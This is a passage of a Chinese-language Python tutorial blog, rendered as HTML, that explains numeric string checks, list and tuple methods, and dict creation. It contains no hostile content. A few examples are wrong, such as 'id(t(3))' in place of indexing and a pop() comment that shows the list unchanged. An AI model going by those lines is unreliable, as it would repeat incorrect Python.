</span><br></pre></td></tr></table></figure><h3 id="（23）-数字系列-了解"><a href="#（23）-数字系列-了解" class="headerlink" title="（23） 数字系列(了解)"></a>（23） 数字系列(了解)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">num1 = <span class="string">b&#x27;4&#x27;</span>  <span class="comment"># bytes 字节</span></span><br><span class="line">num2 = <span class="string">u&#x27;4&#x27;</span>  <span class="comment"># unicode,python3中无需加u就是unicode</span></span><br><span class="line">num3 = <span class="string">&#x27;四&#x27;</span>  <span class="comment"># 中文数字</span></span><br><span class="line">num4 = <span class="string">&#x27;Ⅳ&#x27;</span>  <span class="comment"># 罗马数字</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># isdigit只能识别:num1,num2</span></span><br><span class="line"><span class="built_in">print</span>(num1.isdigit()) <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(num2.isdigit()) <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(num3.isdigit()) <span class="comment"># False</span></span><br><span class="line"><span class="built_in">print</span>(num4.isdigit()) <span class="comment"># False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># isnumeric可以识别:num2,num3,num4 (银行收款)</span></span><br><span class="line"><span class="built_in">print</span>(num2.isnumeric()) <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(num3.isnumeric()) <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(num4.isnumeric()) <span class="comment"># True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># isdecimal只能识别:num2</span></span><br><span class="line"><span class="built_in">print</span>(num2.isdecimal()) <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(num3.isdecimal()) <span class="comment"># False</span></span><br><span class="line"><span class="built_in">print</span>(num4.isdecimal()) <span class="comment"># False</span></span><br></pre></td></tr></table></figure><h1 id="四、列表类型"><a href="#四、列表类型" class="headerlink" title="四、列表类型"></a>四、列表类型</h1><h2 id="1、-定义"><a href="#1、-定义" class="headerlink" title="1、 定义"></a>1、 定义</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.作用: 按位置存放多个值</span></span><br><span class="line"><span class="comment"># 2.定义: 在中括号中按照逗号分隔开,多个任意类型的值</span></span><br><span class="line">l = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="string">&#x27;ymn&#x27;</span>]  <span class="comment"># l = list([1,2,3,&quot;ymn&quot;])</span></span><br></pre></td></tr></table></figure><h2 id="2、-类型转换"><a href="#2、-类型转换" class="headerlink" title="2、 类型转换"></a>2、 类型转换</h2><p>&#x3D;&#x3D; 但凡能够被for循环遍历的类型都可以当做参数传给list( )转成列表 &#x3D;&#x3D;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">res = <span class="built_in">list</span>(<span class="string">&quot;hello&quot;</span>)  <span class="comment"># list底层做的就是for循环那个参数,然后把每个值都放到列表中</span></span><br><span class="line"><span class="built_in">print</span>(res)    <span class="comment"># [&#x27;h&#x27;,&#x27;e&#x27;,&#x27;l&#x27;,&#x27;l&#x27;,&#x27;o&#x27;]</span></span><br><span class="line"></span><br><span class="line">res1 = <span class="built_in">list</span>(&#123;<span class="string">&#x27;k1&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;k2&#x27;</span>:<span class="number">2</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(res1)   <span class="comment"># [&#x27;k1&#x27;,&#x27;k2&#x27;]</span></span><br></pre></td></tr></table></figure><h2 id="3、-内置方法"><a href="#3、-内置方法" class="headerlink" title="3、 内置方法"></a>3、 内置方法</h2><h3 id="（1）-索引取值"><a href="#（1）-索引取值" class="headerlink" title="（1） 索引取值"></a>（1） 索引取值</h3><p>按照索引存取值(正向&#x2F;反向存取):即可以取也可以改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">l = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="string">&#x27;ymn&#x27;</span>]</span><br><span class="line"><span class="comment"># 正向取</span></span><br><span class="line"><span class="built_in">print</span>(l[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 反向取</span></span><br><span class="line"><span class="built_in">print</span>(l[-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以取也可以改</span></span><br><span class="line"><span class="comment"># 索引存在则修改对应的值</span></span><br><span class="line">l[<span class="number">2</span>] = <span class="number">999</span></span><br><span class="line"><span class="built_in">print</span>(l[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 索引不存在,无论是取还是修改都会报错</span></span><br><span class="line">l[<span class="number">5</span>] = <span class="number">555</span></span><br><span class="line"><span class="built_in">print</span>(l)</span><br></pre></td></tr></table></figure><h3 id="（2）切片-顾头不顾尾-步长"><a href="#（2）切片-顾头不顾尾-步长" class="headerlink" title="（2）切片(顾头不顾尾,步长)"></a>（2）切片(顾头不顾尾,步长)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">l = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="string">&#x27;ymn&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(l[<span class="number">0</span>:<span class="number">3</span>])   <span class="comment"># [1,2,3]</span></span><br><span class="line"><span class="built_in">print</span>(l[:])     <span class="comment"># 切片等同于拷贝行为,而且相当于浅拷贝</span></span><br><span class="line"><span class="built_in">print</span>(l[::-<span class="number">1</span>])  <span class="comment"># 列表倒序</span></span><br></pre></td></tr></table></figure><h3 id="（3）长度-len"><a href="#（3）长度-len" class="headerlink" title="（3）长度 len"></a>（3）长度 len</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">l = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(l)) <span class="comment"># 5</span></span><br></pre></td></tr></table></figure><h3 id="（4）成员运算符in和not-in"><a href="#（4）成员运算符in和not-in" class="headerlink" title="（4）成员运算符in和not in"></a>（4）成员运算符in和not in</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">l = [<span class="string">&#x27;lxx&#x27;</span>,<span class="string">&#x27;love&#x27;</span>,<span class="string">&#x27;npy&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;mn&#x27;</span> <span class="keyword">in</span> l)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;mn&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> l)</span><br></pre></td></tr></table></figure><h3 id="（5）append"><a href="#（5）append" class="headerlink" title="（5）append"></a>（5）append</h3><blockquote><p>追加 在列表的末尾追加值</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">l = [<span class="number">11</span>,<span class="string">&#x27;ymn&#x27;</span>,<span class="number">666</span>]</span><br><span class="line">l.append(<span class="number">333</span>)</span><br><span class="line"><span class="built_in">print</span>(l)   <span class="comment"># [11,&#x27;ymn&#x27;,666,333]</span></span><br></pre></td></tr></table></figure><h3 id="（6）insert-插入"><a href="#（6）insert-插入" class="headerlink" title="（6）insert 插入"></a>（6）insert 插入</h3><blockquote><p>当索引大于当前列表最大索引,默认插入到列表末尾</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">l = [<span class="number">11</span>, <span class="string">&#x27;ymn&#x27;</span>, <span class="number">666</span>]</span><br><span class="line"><span class="comment"># l.insert(1, &#x27;tom&#x27;)</span></span><br><span class="line"><span class="comment"># print(l)  # [11,&#x27;tom&#x27;,&#x27;ymn&#x27;, 666]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 需求: 把&quot;jack&quot;插入到l的最后一个位置,使用insert</span></span><br><span class="line"><span class="comment"># l.insert(-1, &#x27;jack&#x27;)</span></span><br><span class="line"><span class="comment"># print(l)</span></span><br></pre></td></tr></table></figure><h3 id="（7）-extend-迭代添加"><a href="#（7）-extend-迭代添加" class="headerlink" title="（7） extend 迭代添加"></a>（7） extend 迭代添加</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">l = [<span class="number">11</span>, <span class="string">&#x27;ymn&#x27;</span>, <span class="number">666</span>]</span><br><span class="line">l1 = [<span class="number">99</span>,<span class="number">88</span>,<span class="number">77</span>]</span><br><span class="line">l.extend(l1)</span><br><span class="line"><span class="built_in">print</span>(l)      <span class="comment"># [11, &#x27;ymn&#x27;, 666,99,88,77]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 内部实现</span></span><br><span class="line"><span class="keyword">for</span> el <span class="keyword">in</span> l1:</span><br><span class="line">    l.append(el)</span><br><span class="line"><span class="built_in">print</span>(l)</span><br></pre></td></tr></table></figure><h3 id="（8）-删除"><a href="#（8）-删除" class="headerlink" title="（8） 删除"></a>（8） 删除</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 方式1: del 通用的删除方法,没有返回值</span></span><br><span class="line">l = [<span class="number">11</span>, <span class="string">&#x27;ymn&#x27;</span>, <span class="number">666</span>]</span><br><span class="line"><span class="keyword">del</span> l[<span class="number">1</span>]</span><br><span class="line">x = <span class="keyword">del</span> l[<span class="number">1</span>] <span class="comment"># 抛出异常,不支持赋值语法</span></span><br><span class="line"><span class="built_in">print</span>(l)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方式二:l.pop() 根据索引删除,会返回删除的值</span></span><br><span class="line">l = [<span class="number">11</span>, <span class="string">&#x27;ymn&#x27;</span>, <span class="number">666</span>]</span><br><span class="line">res = l.pop() <span class="comment"># 不指定索引默认删除最后一个</span></span><br><span class="line"><span class="built_in">print</span>(res)  <span class="comment"># 666</span></span><br><span class="line"><span class="built_in">print</span>(l)    <span class="comment"># [11, &#x27;ymn&#x27;, 666]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 方式三:l.remove() 根据元素删除,返回None</span></span><br><span class="line">l = [<span class="number">11</span>, <span class="string">&#x27;ymn&#x27;</span>, <span class="number">666</span>]</span><br><span class="line">l.remove(<span class="string">&#x27;ymn&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(l)  <span class="comment"># [11, 666]</span></span><br></pre></td></tr></table></figure><h3 id="（9）-for循环"><a href="#（9）-for循环" class="headerlink" title="（9） for循环"></a>（9） for循环</h3><blockquote><p> 谨记:循环只是为了读,尽量不要修改,否则会出现索引问题</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]:</span><br><span class="line">    <span class="built_in">print</span>(x)</span><br></pre></td></tr></table></figure><h3 id="（10）-count"><a href="#（10）-count" class="headerlink" title="（10） count( )"></a>（10） count( )</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 统计元素在列表中出现的次数</span></span><br><span class="line">l = [<span class="number">11</span>, <span class="number">22</span>, <span class="number">11</span>, <span class="number">22</span>, <span class="string">&#x27;ymn&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(l.count(<span class="number">11</span>))  <span class="comment"># 2</span></span><br></pre></td></tr></table></figure><h3 id="（11）-index"><a href="#（11）-index" class="headerlink" title="（11） index( )"></a>（11） index( )</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 返回元素在列表中首位索引</span></span><br><span class="line">l = [<span class="string">&#x27;ymn&#x27;</span>,<span class="number">18</span>]</span><br><span class="line"><span class="built_in">print</span>(l.index(<span class="string">&#x27;ymn&#x27;</span>)) <span class="comment"># 0</span></span><br><span class="line"><span class="built_in">print</span>(l.index(<span class="string">&#x27;mn&#x27;</span>))  <span class="comment"># 找不到报错</span></span><br></pre></td></tr></table></figure><h3 id="（12）clear"><a href="#（12）clear" class="headerlink" title="（12）clear( )"></a>（12）clear( )</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 清空列表</span></span><br><span class="line">l = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line">l.clear()</span><br><span class="line"><span class="built_in">print</span>(l)</span><br></pre></td></tr></table></figure><h3 id="（13）-reverse"><a href="#（13）-reverse" class="headerlink" title="（13） reverse( )"></a>（13） reverse( )</h3><blockquote><p>不是排序,就是把列表倒过来</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">l = [<span class="number">11</span>, <span class="number">22</span>, <span class="number">11</span>, <span class="number">22</span>, <span class="string">&#x27;ymn&#x27;</span>]</span><br><span class="line">l.reverse()</span><br><span class="line"><span class="built_in">print</span>(l)  <span class="comment"># [&#x27;ymn&#x27;,22,11,22,11]</span></span><br></pre></td></tr></table></figure><h3 id="（14）sort"><a href="#（14）sort" class="headerlink" title="（14）sort( )"></a>（14）sort( )</h3><blockquote><p>列表内的元素必须是同种类型才可以排序</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">l = [<span class="string">&#x27;ymn&#x27;</span>,<span class="string">&#x27;123&#x27;</span>,<span class="string">&#x27;haha&#x27;</span>]  <span class="comment"># 字符串比大小,按照对应的位置的字符依次pk,一旦有结果就停止pk,字符串的大小按照ASCII码表的先后顺序区别字符大小</span></span><br><span class="line"></span><br><span class="line">l.sort() <span class="comment"># 默认从小到大排,升序</span></span><br><span class="line"><span class="built_in">print</span>(l) <span class="comment"># [&#x27;123&#x27;, &#x27;haha&#x27;, &#x27;ymn&#x27;]</span></span><br><span class="line"></span><br><span class="line">l.sort(reverse=<span class="literal">True</span>) <span class="comment"># 从大到小,降序</span></span><br><span class="line"><span class="built_in">print</span>(l) <span class="comment"># [&#x27;ymn&#x27;, &#x27;haha&#x27;, &#x27;123&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;a&#x27;</span> &gt; <span class="string">&quot;A&quot;</span>) <span class="comment"># True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 了解:列表也可以比大小,原理同字符串一样,对应位置必须是同种类型,否则报错</span></span><br><span class="line">l = [<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>,<span class="number">44</span>]</span><br><span class="line">l1 = [<span class="number">12</span>]</span><br><span class="line"><span class="built_in">print</span>(l &lt; l1)  <span class="comment"># True</span></span><br></pre></td></tr></table></figure><h3 id="（15）-enumerate"><a href="#（15）-enumerate" class="headerlink" title="（15） enumerate"></a>（15） enumerate</h3><blockquote><p>enumerate 是一个内置函数 , 参数是一个可迭代对象 , 即可以for的数据类型 , 循环返回索引和值</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i,v <span class="keyword">in</span> <span class="built_in">enumerate</span>([<span class="string">&quot;tom&quot;</span>,<span class="string">&quot;18&quot;</span>,<span class="string">&quot;喝酒&quot;</span>]):</span><br><span class="line">    <span class="built_in">print</span>(i,v)</span><br></pre></td></tr></table></figure><h1 id="五、-元组类型"><a href="#五、-元组类型" class="headerlink" title="五、 元组类型"></a>五、 元组类型</h1><blockquote><p>元组就是”一个不可变的列表”</p></blockquote><h2 id="1、-定义-1"><a href="#1、-定义-1" class="headerlink" title="1、 定义"></a>1、 定义</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.作用: 按照索引(位置)存放多个值,只用于读不用于改</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.定义: ()内用逗号分隔开多个任意类型的元素</span></span><br><span class="line">t = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)  <span class="comment"># t = tupte(1,2,3)</span></span><br><span class="line"><span class="built_in">print</span>(t,<span class="built_in">type</span>(t)) <span class="comment"># (1,2,3) &lt;class tuple&gt;</span></span><br><span class="line"></span><br><span class="line">x = (<span class="number">10</span>) <span class="comment"># 单独一个括号代表包含的意思</span></span><br><span class="line"><span class="built_in">print</span>(x,<span class="built_in">type</span>(x))  <span class="comment"># 10 &lt;class int&gt;</span></span><br><span class="line"></span><br><span class="line">tu = (<span class="number">10</span>,)  <span class="comment"># 如果元组中只有一个元素,必须加逗号</span></span><br></pre></td></tr></table></figure><h2 id="2、-探秘元组的不可变-了解"><a href="#2、-探秘元组的不可变-了解" class="headerlink" title="2、  探秘元组的不可变(了解)"></a>2、  探秘元组的不可变(了解)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">t = (<span class="number">11</span>,<span class="number">22</span>,<span class="string">&#x27;aa&#x27;</span>,[<span class="number">11</span>,<span class="number">22</span>]) </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(t(<span class="number">3</span>)))  <span class="comment"># 75438567785467</span></span><br><span class="line"><span class="comment"># t = (0-&gt;值1的内存地址,1-&gt;值22的内存地址,2-&gt;值&quot;aa&quot;的内存地址)</span></span><br><span class="line"><span class="comment"># 元组在内存中存的是索引和值的内存地址,说元素不可变,就是当元祖在内存中创建好了,那么索引对应的内存地址就不能改变了,换句话说,当元祖中的索引对应的内存地址没有发生改变,那么元组就没有改变</span></span><br><span class="line">t[<span class="number">1</span>] = <span class="number">99</span> <span class="comment"># 不能改,报错</span></span><br><span class="line"></span><br><span class="line">t[<span class="number">3</span>][<span class="number">1</span>] = <span class="number">99</span></span><br><span class="line"><span class="built_in">print</span>(t) <span class="comment"># (11, ,22, &#x27;aa&#x27;, [11, 99]) 因为索引3对应的值是可变类型的数据,</span></span><br><span class="line"><span class="comment"># 我们只是对他的内部元素进行了修改,但是元祖中这个索引对应的内存地址并没有,所以元组并没有发生改变</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(t(<span class="number">3</span>)))  <span class="comment"># 75438567785467</span></span><br></pre></td></tr></table></figure><h2 id="3、-类型转换"><a href="#3、-类型转换" class="headerlink" title="3、  类型转换"></a>3、  类型转换</h2><blockquote><p>只要是可以被for循环的数据类型都可以被tuple强制转换成元组</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">tuple</span>(<span class="string">&#x27;hello&#x27;</span>))      <span class="comment"># (&#x27;h&#x27;,&#x27;e&#x27;,&#x27;l&#x27;,&#x27;l&#x27;,o)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">tuple</span>([<span class="string">&#x27;hello&#x27;</span>]))    <span class="comment"># (&quot;hello&quot;,)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">tuple</span>(&#123;<span class="string">&#x27;hello&#x27;</span>:<span class="number">1</span>&#125;))  <span class="comment"># (&quot;hello&quot;,)</span></span><br></pre></td></tr></table></figure><h2 id="4、-常用和内置方法"><a href="#4、-常用和内置方法" class="headerlink" title="4、 常用和内置方法"></a>4、 常用和内置方法</h2><h3 id="（1）-索引取值-1"><a href="#（1）-索引取值-1" class="headerlink" title="（1） 索引取值"></a>（1） 索引取值</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 按照索引存取值(正向/反向存取):只能取</span></span><br><span class="line">t = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="string">&#x27;ymn&#x27;</span>)</span><br><span class="line"><span class="comment"># 正向取</span></span><br><span class="line"><span class="built_in">print</span>(t[<span class="number">1</span>])   <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 反向取</span></span><br><span class="line"><span class="built_in">print</span>(t[-<span class="number">1</span>])  <span class="comment"># &quot;ymn&quot;</span></span><br></pre></td></tr></table></figure><h3 id="（2）-切片-顾头不顾尾-步长"><a href="#（2）-切片-顾头不顾尾-步长" class="headerlink" title="（2） 切片 (顾头不顾尾,步长)"></a>（2） 切片 (顾头不顾尾,步长)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">t = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="string">&#x27;ymn&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(t[<span class="number">0</span>:<span class="number">3</span>])     <span class="comment"># (1,2,3)</span></span><br><span class="line"><span class="built_in">print</span>(t[:])       <span class="comment"># 切片等同于拷贝行为,而且相当于浅拷贝</span></span><br><span class="line"><span class="built_in">print</span>(t[::-<span class="number">1</span>])    <span class="comment"># 元祖倒叙</span></span><br></pre></td></tr></table></figure><h3 id="（3）长度-len-1"><a href="#（3）长度-len-1" class="headerlink" title="（3）长度 len"></a>（3）长度 len</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tu = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(tu))  <span class="comment"># 4</span></span><br></pre></td></tr></table></figure><h3 id="（4）成员运算符in和not-in-1"><a href="#（4）成员运算符in和not-in-1" class="headerlink" title="（4）成员运算符in和not in"></a>（4）成员运算符in和not in</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">t = (<span class="string">&#x27;ymn&#x27;</span>,<span class="number">18</span>,<span class="string">&#x27;男&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;mn&#x27;</span> <span class="keyword">in</span> t)     <span class="comment"># False</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;mn&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> t) <span class="comment"># True</span></span><br></pre></td></tr></table></figure><h3 id="（5）-循环"><a href="#（5）-循环" class="headerlink" title="（5） 循环"></a>（5） 循环</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">t = (1, 2, 3, &#x27;ymn&#x27;)</span><br><span class="line">for el in t:</span><br><span class="line">    print(el)</span><br></pre></td></tr></table></figure><h3 id="（6）-内置方法"><a href="#（6）-内置方法" class="headerlink" title="（6） 内置方法"></a>（6） 内置方法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">t = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(t.count(<span class="number">1</span>))  <span class="comment"># 1</span></span><br><span class="line"><span class="built_in">print</span>(t.index(<span class="number">1</span>))  <span class="comment"># 0</span></span><br></pre></td></tr></table></figure><h1 id="六、-字典类型"><a href="#六、-字典类型" class="headerlink" title="六、 字典类型"></a>六、 字典类型</h1><h2 id="1、定义"><a href="#1、定义" class="headerlink" title="1、定义"></a>1、定义</h2><blockquote><p>{ }内用逗号分隔开多个key:value,其中value可以是任意类型,但是key必须是不可变的类型,且不能重复</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dic = &#123;<span class="string">&quot;k1&quot;</span>:<span class="number">1</span>&#125;     <span class="comment"># dic = dict(k1=1&#125;)</span></span><br><span class="line"><span class="built_in">print</span>(dic)</span><br></pre></td></tr></table></figure><h2 id="2、类型转换-2"><a href="#2、类型转换-2" class="headerlink" title="2、类型转换"></a>2、类型转换</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">info = [</span><br><span class="line">    [<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;ymn&#x27;</span>],</span><br><span class="line">    [<span class="string">&#x27;age&#x27;</span>,<span class="number">18</span>],</span><br><span class="line">    [<span class="string">&#x27;gender&#x27;</span>,<span class="string">&quot;男&quot;</span>],</span><br><span class="line">]</span><br><span class="line">d = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> k,v <span class="keyword">in</span> info:</span><br><span class="line">    d[k] = v</span><br><span class="line"><span class="built_in">print</span>(d)    <span class="comment"># &#123;&quot;name&quot;:&#x27;ymn&#x27;,&#x27;age&#x27;:18,&#x27;gender&#x27;:&#x27;男&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line">res = <span class="built_in">dict</span>(info) <span class="comment"># 一行代码解决,实际上内部做的就是上面的for循环,前提是子元素必须是有两个值</span></span><br><span class="line"><span class="built_in">print</span>(res)  <span class="comment"># &#123;&quot;name&quot;:&#x27;ymn&#x27;,&#x27;age&#x27;:18,&#x27;gender&#x27;:&#x27;男&#x27;&#125;</span></span><br></pre></td></tr></table></figure><h2 id="3、初始化字典"><a href="#3、初始化字典" class="headerlink" title="3、初始化字典"></a>3、初始化字典</h2><blockquote><p>即字典的key对应的值为None</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.直接手写</span></span><br><span class="line">d = &#123;<span class="string">&#x27;k1&#x27;</span>:<span class="literal">None</span>,<span class="string">&#x27;k2&#x27;</span>:<span class="literal">None</span>,<span class="string">&#x27;k3&#x27;</span>:<span class="literal">None</span>&#125;</span><br><span 